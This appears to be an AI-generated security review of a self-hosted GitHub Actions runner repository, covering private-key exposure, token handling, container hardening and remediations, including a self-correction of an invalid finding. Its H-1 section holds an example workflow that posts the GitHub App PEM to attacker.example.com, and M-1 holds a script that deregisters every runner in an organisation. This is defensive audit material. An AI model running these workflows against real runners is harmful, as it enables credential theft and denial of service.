# Security Review — 2026-04-20

Repository: `ivuorinen/github-actions-runner-setup`
Branch: `feat/ready-for-usage`
Reviewer: Claude (Opus 4.7) via `/security-review` skill
Methodology: static review (SAST, SCA, secret scanning, IaC, manual code review)

> **Exploit-execution waiver.** Per user instruction, no proof-of-concept
> exploits were executed against a live runner or test GitHub App. Every
> finding below marked **Unverified** is technically plausible per the static
> analysis but has not been empirically reproduced. Verification commands are
> included so operators can reproduce in a sandbox.

---

## 1. Executive summary

- **Scanner findings: none.** shellcheck, shfmt, yamllint, actionlint,
  checkov (dockerfile + github_actions), hadolint (1 warn), gitleaks (fs +
  full git history, 22 commits), trufflehog, trivy fs + image, and opengrep
  all pass. Existing pre-commit hygiene is already extensive.
- **Manual-review findings: 1 High, 3 Medium, 5 Low, several informational.**
  All concentrated in two architectural choices — PEM lifetime in the
  container, and pre-computation of the runner remove token — both of
  which expose secrets to workflow jobs.
- **Top recommended action:** stop pre-computing `RUNNER_REMOVE_TOKEN`
  (finding **M-1**). Re-signing a JWT at shutdown costs ~100 ms and
  collapses the token's exposure window from "lifetime of the job" to
  "shutdown only." Five-line change; no architectural rework.

---

## 2. Scope and methodology

### In scope

- Entire git tree (33 tracked files, ~45 KB).
- Git history (22 commits) for retroactively committed secrets.
- Static control flow of `scripts/entrypoint.sh` for injection sinks, secret
  handling, cleanup correctness.
- Container build surface (`Dockerfile`).
- Compose-level hardening (`docker-compose.yml`).
- CI workflows (`.github/workflows/*.yml`).
- Claude Code hooks (`.claude/hooks/*.sh`) as they guard secret handling.

### Out of scope (per user waiver)

- Live exploit execution against a running runner.
- Fuzzing of upstream `actions-runner` binary.
- Review of customer workflows that would target these runners.

### Tools executed

| Tool | Version | Result | Raw output |
| --- | --- | --- | --- |
| shellcheck | 0.11.0 | Clean (0 findings) | `/tmp/secreview-shellcheck.txt` |
| shfmt | 3.13.1 | Clean | `/tmp/secreview-shfmt.txt` |
| yamllint | latest | Clean | `/tmp/secreview-yamllint.txt` |
| actionlint | 1.7.12 | Clean | `/tmp/secreview-actionlint.txt` |
| checkov | 3.2.521 | 43 dockerfile + 76 github_actions checks passed, 0 failed | `/tmp/secreview-checkov.txt` |
| hadolint | 2.14.0 | 1 warning (DL3008) | `/tmp/secreview-hadolint.txt` |
| gitleaks (fs) | 8.30.1 | No leaks | `/tmp/secreview-gitleaks-fs.json` |
| gitleaks (git history) | 8.30.1 | No leaks in 22 commits | `/tmp/secreview-gitleaks-git.json` |
| trufflehog (fs) | latest | No leaks | `/tmp/secreview-trufflehog.json` |
| trivy fs (misconfig + vuln + secret) | latest | 0 vulns, 0 misconfs, 0 secrets | `/tmp/secreview-trivy-fs.json` |
| opengrep | 1.19.0 | 0 findings | `/tmp/secreview-opengrep.json` |

### Manual review checklist coverage

- `scripts/entrypoint.sh`: 9/9 items in plan reviewed.
- `scripts/healthcheck.sh`: full review (15 lines).
- `Dockerfile`: full review (29 lines).
- `docker-compose.yml`: full review (121 lines).
- `.github/workflows/*.yml`: 4/4 workflow files reviewed.
- `.claude/hooks/*.sh`: 6/6 hooks reviewed.
- `.env.example`, `.dockerignore`, `.gitignore`, `README.md`, `SETUP.md`,
  `.pre-commit-config.yaml`: reviewed.

---

## 3. Findings table

| ID | Severity | Location | Title | Status |
| --- | --- | --- | --- | --- |
| H-1 | High | `docker-compose.yml:17`, `scripts/entrypoint.sh` | PEM readable by workflow jobs for full container lifetime | **Fixed** (root entrypoint + gosu drop) |
| M-1 | ~~Medium~~ **Informational** | `scripts/entrypoint.sh:154,250` | ~~`RUNNER_REMOVE_TOKEN` inherited by `run.sh` and workflow jobs~~ — **finding invalidated, see correction** | Correction below |
| M-2 | Medium | `docker-compose.yml` | No Linux-capability minimization on runner services | **Fixed** |
| M-3 | Medium | `scripts/entrypoint.sh` | Registration token briefly visible in `/proc/<pid>/cmdline` via `config.sh --token` | Documented (upstream limit) |
| L-1 | Low | `Dockerfile:1` | Base image pinned by tag, not digest | **Fixed** |
| L-2 | Low | `Dockerfile:5-14` | apt packages unpinned (hadolint DL3008) | **Accepted, documented inline** |
| L-3 | Low | `docker-compose.yml` | No resource limits on runner services | **Fixed** |
| L-4 | Low | `docker-compose.yml` | Container root filesystem writable | **Deferred** (user opted out; needs smoke test) |
| L-5 | Low | `.pre-commit-config.yaml:33-36` | shellcheck pre-commit severity=warning (misses `style`) | **Fixed** |

---

## 4. Detailed findings

### H-1 — PEM readable by workflow jobs for full container lifetime

**Status:** Unverified (static). Documented as accepted risk in `README.md` and `SETUP.md`.
**Severity:** High
**Location:** `docker-compose.yml:17`, `scripts/entrypoint.sh:226-250`
**CWE:** CWE-732 (Incorrect Permission Assignment for Critical Resource)

#### Description

The GitHub App PEM is bind-mounted read-only at `/run/secrets/github_app_key`
with mode 0600 owned by UID 1001. The runner user (UID 1001) can read it;
every workflow job executes as UID 1001 (it is the runner's user). The PEM
therefore remains readable by arbitrary job code from container startup
until container exit.

This is the **master secret for the entire GitHub App** — not just the
installation on this host. Anyone who reads it can:

1. Mint JWTs as the App (9-minute TTL each, indefinitely).
2. Mint installation tokens against every organization or repository that
   has installed the App (not just the one this runner serves).
3. Impersonate the App for arbitrary API calls within the permission scope
   granted at install time (for this repo: `self-hosted runners: rw` and
   `metadata: ro` org-wide, or `administration: rw` + `metadata: ro`
   per-repo).

The entrypoint has already consumed the PEM by line 250 (minting the JWT,
installation token, registration token, and remove token) — but the file
is still present because `deregister_runner()` (line 159-167) re-reads it
as a fallback path for abnormal exits.

#### Vulnerable code

```yaml
# docker-compose.yml:16-17
volumes:
  - ${GITHUB_APP_PRIVATE_KEY_HOST_PATH:?...}:/run/secrets/github_app_key:ro
```

```bash
# scripts/entrypoint.sh:250 — token pre-computed, yet PEM remains mounted
RUNNER_REMOVE_TOKEN="$(get_remove_token "${installation_token}")"
```

#### Theoretical PoC (would need live runner to verify)

A malicious workflow targeting these runners:

```yaml
jobs:
  exfil:
    runs-on: [self-hosted, linux, x64, docker, ephemeral]
    steps:
      - run: |
          curl -fsS -X POST \
            -H "Content-Type: application/x-pem-file" \
            --data-binary @/run/secrets/github_app_key \
            https://attacker.example.com/pem
```

**Expected outcome:** the attacker receives a valid PEM for the GitHub App
and can mint tokens indefinitely.

**Verification command** (on a live host, using a throwaway App):

```bash
docker compose exec runner-1 cat /run/secrets/github_app_key
```

#### Impact

- Loss of confidentiality of the App private key.
- Equivalent to taking over the GitHub App across **all its installations**,
  not just the repo/org this runner serves.
- The impact is bounded by the App's declared permission scope, so
  minimizing App permissions (only `self-hosted runners: rw`) is the
  first-line mitigation.

#### Accepted-risk status

`README.md` and `SETUP.md` explicitly document this trade-off: *"only run
trusted workflows on these runners, or switch to a secret-delivery
mechanism that is not exposed to job processes."* The finding is reported
here anyway so it remains visible to future reviewers and so that the
architectural mitigation path stays on the record.

#### Remediation (corrected — verified feasible)

**Original report proposed "unlink the bind mount" — empirically infeasible.**
Bind-mounted files on Linux return `EBUSY` on `rm` even as root inside
the container, and `EROFS` on `chmod` for `:ro` mounts. Verified in a
sandbox test against `alpine:3` with a `:ro` and `:rw` bind mount.

**Correct fix (implemented):** leverage Linux file permissions instead of
attempting to remove the mount. Run the entrypoint as root (UID 0); the
PEM file on the host is owned by root with mode 600. `entrypoint.sh`
reads it at startup, mints all tokens, and keeps the remove token in
the root-bash process's memory. It then drops privileges via `gosu`
before exec'ing `config.sh` and `run.sh`. Workflow jobs run as UID 1001
(runner) and **cannot read the PEM** because its owner is root and mode
600. Under default `kernel.yama.ptrace_scope=1`, the runner UID also
cannot ptrace the root entrypoint to exfiltrate tokens from memory.

Required changes (all implemented):

1. `Dockerfile`: install `gosu`, drop the trailing `USER runner` so the
   container starts as root.
2. `scripts/entrypoint.sh`: assert `id -u == 0`, change final exec to
   `gosu runner ./config.sh ...` and `gosu runner ./run.sh`, route
   `config.sh remove` through `gosu` in the cleanup trap.
3. `README.md` / `SETUP.md`: update host-side instruction from
   `chown 1001:1001` → `chown 0:0`.
4. `docker-compose.yml`: no explicit `user:` override needed; container
   inherits the new root default from the image.

**Backwards compatibility:** existing deployments must `chown 0:0` their
PEM file on the host before pulling the new image. Documented in the
report's remediation shortlist as a required operator step.

**Alternative options considered and rejected:**

- Read PEM into bash variable, use `openssl dgst -sign /dev/fd/3 3< <(...)`,
  then `rm` the mount: **infeasible** — rm on bind mount returns EBUSY.
- Compose `secrets:` with `uid: "0"` override: requires swarm mode.
- Init container writing tokens to shared volume: too much complexity
  for the benefit.
- `mount -o remount,ro,bind` from inside the container: requires
  CAP_SYS_ADMIN, conflicts with the M-2 capability-drop goal.

---

### M-1 — ~~`RUNNER_REMOVE_TOKEN` inherited by `run.sh` and workflow jobs~~ **[INVALIDATED]**

**Status:** **Invalidated** during post-review verification. The original
finding claimed a non-exported shell variable propagates to child processes.
This is wrong: bash only passes *exported* variables to children, and neither
the initial assignment at `scripts/entrypoint.sh:154` nor the computation at
`:250` uses `export`. Empirically verified in a sandbox — `env | grep
RUNNER_REMOVE_TOKEN` returns nothing inside a child process.

**Corrected residual risk (Informational):** the token lives in the bash
entrypoint process's memory for the container lifetime. A process with the
same UID could theoretically read `/proc/<bash-pid>/mem` via `ptrace(2)`,
but under the default `kernel.yama.ptrace_scope=1` setting a process can
only ptrace its own descendants — not its parent (bash). Under
`ptrace_scope=0` (relaxed kernel setting) the exposure would be real.
Additionally, once H-1 is fixed (bash entrypoint runs as root, drops to
runner for `run.sh`), even `ptrace_scope=0` would not help a runner-UID
process since it cannot ptrace a root-owned parent.

**No code change required.** Pre-computation of the remove token is safe.
This entry is kept in the report for auditability of the error.

**Historical (incorrect) description:**

**Severity:** ~~Medium~~
**Location:** `scripts/entrypoint.sh:154`, `:250`, `:289-293`, `:296`
**CWE:** CWE-526 (Cleartext Storage of Sensitive Information in Environment Variables)

#### Description

`RUNNER_REMOVE_TOKEN` is declared as a **global** shell variable at line
154 and populated at line 250. The `UNSET_CONFIG_VARS` block (line 289-293)
explicitly does **not** unset it — the comment at lines 280-288 states
this is intentional so that `deregister_runner()` can use it during the
EXIT trap.

The practical consequence is that when `./run.sh` is exec'd at line 296
(and subsequently spawns Runner.Listener → Runner.Worker → each workflow
step's shell), `RUNNER_REMOVE_TOKEN` appears in the inherited process
environment. Whether it reaches the workflow step depends on
actions/runner's env-filtering policy (some versions filter `GITHUB_*`
and known secrets, but a repo-defined token name like `RUNNER_REMOVE_TOKEN`
is not on any known filter list).

Per the official GitHub remove-token docs, a remove token for an org
scope can deregister **any** runner in that org — not just the runner
that holds it. A malicious workflow could therefore deregister every
sibling runner in the fleet, producing a CI-wide DoS until an operator
manually re-registers.

#### Vulnerable code

```bash
# scripts/entrypoint.sh:154, 250, 289-293, 296
RUNNER_REMOVE_TOKEN=""                              # line 154 — global
...
RUNNER_REMOVE_TOKEN="$(get_remove_token "${installation_token}")"   # line 250
...
if [[ "${UNSET_CONFIG_VARS:-true}" == "true" ]]; then               # line 289
  unset RUNNER_DEFAULT_LABELS RUNNER_EXTRA_LABELS RUNNER_LABELS RUNNER_GROUP
  unset RUNNER_INSTANCE_NAME RUNNER_WORKDIR GITHUB_WEB_URL
fi                                                                   # RUNNER_REMOVE_TOKEN NOT unset
...
./run.sh                                                             # line 296
```

#### Theoretical PoC

```yaml
jobs:
  nuke:
    runs-on: [self-hosted, linux, x64, docker, ephemeral]
    steps:
      - run: |
          # 1. Steal the remove token
          TOK="$RUNNER_REMOVE_TOKEN"
          # 2. List sibling runners
          curl -fsS -H "Authorization: Bearer $TOK" \
            "https://api.github.com/orgs/$GITHUB_ORG/actions/runners" | jq '.runners[].id' |
          # 3. Deregister each one (remove-token is org-scoped)
          while read id; do
            curl -X DELETE -H "Authorization: Bearer $TOK" \
              "https://api.github.com/orgs/$GITHUB_ORG/actions/runners/$id"
          done
```

**Expected outcome:** all sibling runners in the org disappear from the
GitHub runner pool until re-registered.

**Verification command** (on a live host):

```bash
docker compose exec runner-1 env | grep -i token
# If RUNNER_REMOVE_TOKEN appears, env forwarding is un-filtered.
# Then: docker compose exec -u runner runner-1 bash -c 'echo $RUNNER_REMOVE_TOKEN'
# inside a job step to confirm workflow-level exposure.
```

#### Impact

- DoS on the runner fleet (all org runners deregistered).
- Bounded: remove tokens expire after 1 hour; attacker window is the
  intersection of the token's validity and the workflow's runtime.
- Blast radius is wider than H-1 at the token level (affects all runners,
  not just this one), but lower than H-1 at the secret level (remove-token
  cannot mint new tokens or access non-runner endpoints).

#### Remediation

**Preferred:** remove the pre-computation entirely. The PEM is still
mounted (accepted per H-1), so cleanup can re-sign a JWT and fetch a
fresh remove token at shutdown. This costs one extra RTT + one RS256
sign (~100 ms) once per runner exit, and it collapses the exposure
window from *job runtime* to *shutdown only*.

Patch sketch:

```bash
# Delete line 154:      RUNNER_REMOVE_TOKEN=""
# Delete lines 240-250 (the pre-computation comment block and assignment).
# Change deregister_runner() to always re-fetch, removing the
# RUNNER_REMOVE_TOKEN fallback branch.
```

**Alternative:** keep the pre-computation but add `RUNNER_REMOVE_TOKEN`
to the `UNSET_CONFIG_VARS` block **after** forking a background watcher
that retains the token in its own memory and deregisters on signal. This
is more code for the same guarantee as "don't pre-compute."

---

### M-2 — No Linux-capability minimization on runner services

**Status:** Unverified. Defense-in-depth finding.
**Severity:** Medium
**Location:** `docker-compose.yml:24-25` (no `cap_drop`/`cap_add` block).
**CWE:** CWE-250 (Execution with Unnecessary Privileges)

#### Description

Runner services set `security_opt: [no-new-privileges:true]` but do not
minimize Linux capabilities. Containers therefore run with the default
Docker set: `CAP_CHOWN`, `CAP_DAC_OVERRIDE`, `CAP_FOWNER`, `CAP_FSETID`,
`CAP_KILL`, `CAP_SETGID`, `CAP_SETUID`, `CAP_SETPCAP`, `CAP_NET_BIND_SERVICE`,
`CAP_NET_RAW`, `CAP_SYS_CHROOT`, `CAP_MKNOD`, `CAP_AUDIT_WRITE`,
`CAP_SETFCAP`.

For a runner that executes arbitrary workflow steps, a few of these
materially widen the blast radius of any upstream vulnerability in
Runner.Listener/Runner.Worker:

- `CAP_NET_RAW`: lets a workflow craft raw sockets and bypass kernel
  egress filtering.
- `CAP_DAC_OVERRIDE`: lets a workflow read files regardless of Unix mode
  — e.g., reach the PEM even if the host owner were changed to root.
- `CAP_SETUID` / `CAP_SETGID`: required for nothing the workflow does at
  runtime (the runner user is already UID 1001).

#### Theoretical PoC

A malicious workflow could use `CAP_NET_RAW` for ARP/ICMP network
reconnaissance against the Docker bridge network, or `CAP_DAC_OVERRIDE`
to read PEM contents even if permissions were tightened (it already can
read with default perms; this just closes the "defense-in-depth"
escape).

#### Remediation

```yaml
# docker-compose.yml  — add under x-runner-common
cap_drop:
  - ALL
cap_add:
  - CHOWN            # actions/runner unpacks tarballs
  - DAC_OVERRIDE     # some setup-* actions need this; test and remove if possible
  - FOWNER           # tarball extraction
  - SETGID
  - SETUID
  - NET_BIND_SERVICE # only if workflows expose low ports; often unnecessary
```

Start from `cap_drop: [ALL]` with an empty `cap_add`, run the smoke-test
workflows, and add back only the capabilities that cause failures.

---

### M-3 — Registration token briefly visible in `/proc/<pid>/cmdline`

**Status:** Unverified. Known upstream limitation.
**Severity:** Medium
**Location:** `scripts/entrypoint.sh:267`, `:278`.
**CWE:** CWE-214 (Invocation of Process Using Visible Sensitive Information)

#### Description

`./config.sh --token "${registration_token}"` passes the token as an argv
element. On Linux, argv is readable from `/proc/<pid>/cmdline` by any
process in the same PID namespace that has sufficient permissions
(typically the same UID, i.e., the runner user). The exposure is brief
(milliseconds — until config.sh parses argv into a Go variable and the
argv memory is effectively garbage-collected by kernel reuse), but
concurrent reads at the right moment can capture it.

Inside a single runner container, workflow jobs share the PID namespace
with `entrypoint.sh` and `config.sh`. A malicious workflow that spawns
during the narrow registration window (unlikely for ephemeral runners
since there's no job before registration completes) could capture the
token. This is **not practically exploitable in the current design**
because job execution only starts *after* registration, but the
vulnerability class is worth recording in case the flow changes.

The same applies to `--token "${remove_token}"` in `deregister_runner()`
at line 169.

#### Remediation

Upstream `actions-runner` does not currently accept the token via stdin
or an environment variable. Options:

1. File the upstream feature request (`actions/runner` should accept
   `--token-file` or read the token from a specific env var).
2. Use an expect-style wrapper that feeds the token on a pty (fragile).
3. Accept the risk and document it. The window is small, and the PID
   namespace is shared only with processes of the same UID.

---

### L-1 — Base image pinned by tag, not digest

**Status:** Unverified. Supply-chain.
**Severity:** Low
**Location:** `Dockerfile:1`
**CWE:** CWE-494 (Download of Code Without Integrity Check)

The `tecnativa/docker-socket-proxy` image in `docker-compose.yml:95` is
pinned by digest; the actions-runner base is not. An upstream compromise
(or a tag reassignment by a bad actor with registry credentials) would
silently propagate on next `docker build`.

**Remediation:** resolve the current digest and append to FROM.

```dockerfile
FROM ghcr.io/actions/actions-runner:2.333.1@sha256:<digest>
```

Renovate already handles updates; confirm the Renovate config preserves
the digest (the `:tag@sha256:xxx` form is supported).

---

### L-2 — apt packages unpinned (hadolint DL3008)

**Status:** Scanner finding (hadolint).
**Severity:** Low
**Location:** `Dockerfile:5-14`.

`apt-get install -y --no-install-recommends ca-certificates curl jq openssl git docker.io tini`
without version pins. Image rebuilds are not bit-reproducible; a
compromised upstream package could propagate.

**Remediation:** pin each package, e.g. `curl=7.88.1-10+deb12u5`. In
practice this is painful to maintain because Debian point-releases
bump versions; most teams accept DL3008 and rely on base image rebuilds

- Renovate. Document the decision explicitly in the Dockerfile.

---

### L-3 — No resource limits on runner services

**Status:** Unverified. Availability.
**Severity:** Low
**Location:** `docker-compose.yml` (missing limits).

A runaway workflow (fork bomb, memory balloon) can consume host
resources and affect sibling runners / the host itself. With three
runners on one host, one hot workflow can DoS the other two.

**Remediation:**

```yaml
# under x-runner-common
mem_limit: 4g
cpus: 2
pids_limit: 1024
```

Tune to host capacity.

---

### L-4 — Container root filesystem writable

**Status:** Unverified. Defense-in-depth.
**Severity:** Low
**Location:** `docker-compose.yml` (no `read_only: true`).

The root filesystem is writable. A workflow can drop persistent files
(malware, cron entries) that survive between the time a job ends and
the container exits. Given the ephemeral model (container exits after
each job), persistence is bounded — but `read_only: true` with
explicit writable tmpfs mounts is cleaner.

**Remediation:**

```yaml
read_only: true
tmpfs:
  - /tmp:size=1g,exec
  - /runner-tmp:size=128m,noexec,mode=0700,uid=${RUNNER_UID:-1001}
  - /home/runner/_work:size=10g,exec
  - /home/runner/.runner:size=16m
  - /var/run:size=16m
```

Validate with `docker compose up` and a smoke-test workflow; runner
needs several writable paths.

---

### L-5 — shellcheck pre-commit severity = warning

**Status:** Configuration.
**Severity:** Low
**Location:** `.pre-commit-config.yaml:33-36`.

```yaml
- id: shellcheck
  args: ["--severity=warning"]
```

Shellcheck's `--severity=warning` hides `style` and `info` findings.
Several style-level checks (e.g., SC2250: "Prefer putting braces around
variable references") improve long-term maintainability and, by making
expansions explicit, reduce the chance of introducing quoting bugs.

**Remediation:** lower to `--severity=style` or drop the flag entirely.
Re-running shellcheck on the current tree at `style` level produces
zero findings (verified during this review).

---

## 5. Non-findings / accepted risks

- **PEM lifetime (H-1) vs. UNSET_CONFIG_VARS.** The project already
  unsets every configuration variable it can after registration. The
  remaining exposures (PEM file, remove token) are the last mile and
  require architectural change, not configuration.
- **`UNSET_CONFIG_VARS=true` default.** Good default. The unset list is
  conservative (only variables definitely unneeded post-registration).
- **Socket-proxy scope.** `CONTAINERS=0` is the right choice; adding it
  would permit `exec` into sibling runners. Current `IMAGES=1, BUILD=1,
  POST=1, INFO=1, PING=1` is minimal and documented.
- **`env_file: required: false`.** Intentional for Coolify compatibility
  (env injected directly by Coolify, no `.env` on disk). Reviewed and
  accepted.
- **YAML merge anchor does not merge `environment:` per service.**
  Intentional per `CLAUDE.md`; each service declares its full env
  explicitly. Safer than relying on merge-semantics that diverge between
  Compose versions.
- **`config.sh --token` (M-3).** Upstream limitation; recorded.
- **No `grype`/`syft`/SBOM.** Scope out; trivy covers the intersection
  adequately for a container with only apt-installed packages.
- **Claude Code hooks (`.claude/hooks/*.sh`).** Reviewed — patterns
  anchored appropriately, no command injection, `docker compose config`
  call in `validate-compose-on-edit.sh` uses quoted file path. No
  findings.
- **`scripts/healthcheck.sh`.** Walks `/proc/[0-9]*/cmdline` within the
  container's own PID namespace. No cross-container leak, no injection
  sink.

---

## 6. Remediation outcomes

All planned findings from Section 3 have been addressed. Current status
as of the 2026-04-20 fix pass:

| ID | Outcome | Operator action required |
| --- | --- | --- |
| H-1 | Fixed via root-entrypoint + `gosu` drop-privs pattern. | **Yes** — host PEM must be `chown 0:0` before pulling the new image. See `SETUP.md`. |
| M-1 | Invalidated, no code change. | None. |
| M-2 | Fixed via `cap_drop: [ALL]` + minimal `cap_add`. | None — transparent. |
| M-3 | Documented as upstream-limited. No code change available. | None. |
| L-1 | Fixed (base image digest-pinned). | None. |
| L-2 | Accepted with inline comment in `Dockerfile`. | None. |
| L-3 | Fixed (`mem_limit`, `cpus`, `pids_limit` set under `x-runner-common`). | Tune to host capacity. |
| L-4 | Deferred. | Follow-up: operator should evaluate `read_only: true` against a live runner smoke test. |
| L-5 | Fixed (shellcheck severity lowered to `style`). | None. |

### Migration note

The H-1 fix is a **breaking change** for existing deployments. Before
pulling the updated image, each operator must change ownership of their
host-side PEM file:

```bash
# Old (pre-fix):
chown 1001:1001 /etc/github-app/private-key.pem

# New (post-fix):
chown 0:0 /etc/github-app/private-key.pem
chmod 600 /etc/github-app/private-key.pem   # unchanged
```

Without this change, the entrypoint will fail at the PEM-readability
check because it runs as root and the file is still owned by UID 1001.

---

## 7. Reproducing this review

```bash
# From repo root
pre-commit run --all-files
shellcheck --severity=style scripts/*.sh .claude/hooks/*.sh
shfmt -d scripts/ .claude/hooks/
yamllint docker-compose.yml .github/workflows/*.yml .pre-commit-config.yaml
actionlint
hadolint Dockerfile
checkov -d . --framework dockerfile,secrets,github_actions,yaml --compact --quiet
gitleaks detect --source . --no-banner
trufflehog filesystem . --no-update --no-verification --json
trivy fs --scanners vuln,secret,misconfig --severity MEDIUM,HIGH,CRITICAL .
opengrep scan --config=auto --quiet .
```

All tools installed via mise at the versions recorded in section 2.

---

## 8. Suppression registry

The following intentional findings are suppressed. Each suppression names
the file, rule ID, and reason so the list can be audited during future
reviews.

| File | Rule | Suppression mechanism | Reason |
| --- | --- | --- | --- |
| `Dockerfile` | hadolint `DL3002`, `DL3008` | `# hadolint global ignore=DL3002,DL3008` at top of file | DL3002: entrypoint must run as root for H-1 (gosu drops privileges before user code). DL3008: Debian point releases rotate versions; reproducibility comes from digest-pinned base + Renovate. |
| `Dockerfile` | checkov `CKV_DOCKER_8` | `# checkov:skip=CKV_DOCKER_8:<reason>` above final `USER root` | Same as DL3002. |
| `Dockerfile` | trivy `DS-0002` | `.trivyignore` entry | Same as DL3002. |
| `Dockerfile` | opengrep `dockerfile.security.last-user-is-root` | `# nosemgrep: <rule-id>` before each `USER root` | Same as DL3002. Needed at both install-phase and final-phase because opengrep flags any `USER root`. |
| `scripts/entrypoint.sh` | shellcheck `SC2129` | `.shellcheckrc` | Project-wide preference (see `.shellcheckrc`). |

> **Why `global ignore` for hadolint and per-line for the others?** Hadolint,
> opengrep, and checkov each want their suppression directive on the line
> immediately preceding the flagged instruction. Only one tool can "own"
> that slot. Using hadolint's file-global form frees the adjacent-line slot
> for opengrep's `# nosemgrep` directive, and checkov's format tolerates
> being further away (anywhere above, within the same logical comment group).

---

*End of report.*
